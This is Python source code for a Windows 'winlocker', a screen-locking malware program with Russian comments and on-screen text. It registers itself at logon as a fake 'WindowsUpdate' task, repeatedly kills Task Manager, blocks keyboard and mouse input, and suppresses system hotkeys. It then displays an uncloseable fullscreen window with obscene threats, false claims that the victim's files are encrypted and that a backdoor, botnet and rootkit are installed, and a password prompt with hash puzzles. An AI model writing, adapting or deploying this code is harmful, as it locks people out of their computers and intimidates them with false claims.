import ctypes, os, sys, time, threading, random, tkinter as tk

# === НАСТРОЙКИ ===
PASSWORD = "1601"
TIMER_SECONDS = 15  # для теста, потом 0 для мгновенной активации

# === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
def block_input(block=True):
    ctypes.windll.user32.BlockInput(block)

# === БЛОКИРУЕМ ВСЕ ОПАСНЫЕ КЛАВИШИ ===
def block_all_keys():
    try:
        import keyboard
        keyboard.add_hotkey('alt+f4', lambda: None, suppress=True)
        keyboard.add_hotkey('alt+tab', lambda: None, suppress=True)
        keyboard.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
        keyboard.add_hotkey('ctrl+alt+del', lambda: None, suppress=True)
        keyboard.add_hotkey('win+d', lambda: None, suppress=True)
        keyboard.add_hotkey('win+r', lambda: None, suppress=True)
        keyboard.add_hotkey('win', lambda: None, suppress=True)
        keyboard.add_hotkey('alt', lambda: None, suppress=True)
        keyboard.add_hotkey('ctrl', lambda: None, suppress=True)
        keyboard.add_hotkey('shift', lambda: None, suppress=True)
        keyboard.add_hotkey('escape', lambda: None, suppress=True)
    except:
        pass

# === УБИВАЕМ ДИСПЕТЧЕР ЗАДАЧ ===
def kill_taskmgr():
    while True:
        os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
        time.sleep(0.1)

# === ПРОПИСЫВАЕМ В АВТОЗАГРУЗКУ ===
def add_to_startup():
    import subprocess
    script_path = os.path.abspath(__file__)
    command = f'python "{script_path}"'
    subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{command}" /sc onlogon /f', shell=True, capture_output=True)

# === АНИМАЦИЯ ВКЛЮЧЕНИЯ ===
def show_boot_animation():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    lbl = tk.Label(root, text="", fg='white', bg='black', font=('Courier', 36, 'bold'))
    lbl.pack(expand=True)
    messages = [
        "ВАС ЗАМЕТИЛ DEDSEK...",
        "ПОДКЛЮЧЕНИЕ К ctOS 2.0...",
        "РАСШИФРОВКА КЛЮЧЕЙ...",
        "DIE"
    ]
    for msg in messages:
        lbl.config(text=msg)
        root.update()
        time.sleep(2)
    root.destroy()

# === ГЛАВНОЕ ОКНО БЛОКИРОВКИ ===
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        # Страшный текст в левом нижнем углу
        scary_text = (
            "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ\n"
            "ПЕРЕЗАГРУЗКА ИЛИ ВЫКЛЮЧЕНИЕ ПК = СНОС WINDOWS\n"
            "ПАРОЛЬ ТЫ НИКОГДА НЕ УЗНАЕШЬ\n"
            "СОСИ ХУЙ\n\n"
            "НО Я НЕ ВЫМОГАТЕЛЬ, Я ДАМ ТЕБЕ ПАРОЛЬ\n"
            "НО НЕ ПРОСТО ПАРОЛЬ, ТЫ ЕГО ДОЛЖЕН РАСШИФРОВАТЬ\n"
            "1 - 5 ПАРОЛИ ВСЕ РАЗНЫЕ СЕТИ\n"
            "МУЧАЙСЯ ПИДОР\n\n"
            "1. standard DES\n$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1\n"
            "2. Bcrypt\n$2y$10$XkyocAmlL3rdiz1Uj72MkOpqd.CHCajedThCzis6AL.62OH8lDr/y\n"
            "3. SHA1\n24b378e0bfaf950a0b97c7d36f2d65301286dcf6\n"
            "4. Base64\nNDM1NjM0MjM0\n"
            "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d"
        )
        self.canvas.create_text(50, 550, text=scary_text, fill='white', font=('Courier', 14), anchor='sw')
        
        # Новые угрожающие надписи от DEDSEK (справа)
        dedsek_text = (
            "DeDsEk тебя приветствует\n"
            "не надо было ничего скачивать\n"
            "из непроверенных источников\n\n"
            "DEDSEK тебя видит\n\n"
            "кстати это еще не один вирус\n"
            "у тебя от меня есть:\n"
            "- Бекдор\n"
            "- Ботнет\n"
            "- Руткит\n"
            "- Червяк такой жирный"
        )
        self.canvas.create_text(750, 400, text=dedsek_text, fill='white', font=('Courier', 16), anchor='e')
        
        # Поле ввода МАКСИМАЛЬНО СПРАВА И ВНИЗУ
        self.canvas.create_text(700, 500, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28), anchor='e')
        self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
        self.canvas.create_window(700, 540, window=self.entry, anchor='e')
        self.status = self.canvas.create_text(700, 580, text="", fill='white', font=('Courier', 20), anchor='e')
        
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_set()
        self.animate()
    
    def check_password(self, event=None):
        if self.entry.get() == PASSWORD:
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            self.canvas.itemconfig(self.status, text="НЕВЕРНЫЙ ПАРОЛЬ!")
            self.entry.delete(0, tk.END)
    
    def animate(self):
        self.win.after(50, self.animate)

# === ЗАПУСК ===
if __name__ == "__main__":
    if os.path.basename(sys.argv[0]) != "winlocker.py":
        TIMER_SECONDS = 0
    
    add_to_startup()
    threading.Thread(target=kill_taskmgr, daemon=True).start()
    time.sleep(TIMER_SECONDS)
    block_input(True)
    threading.Thread(target=block_all_keys, daemon=True).start()
    show_boot_animation()
    app = WinLocker()
    app.root.mainloop()
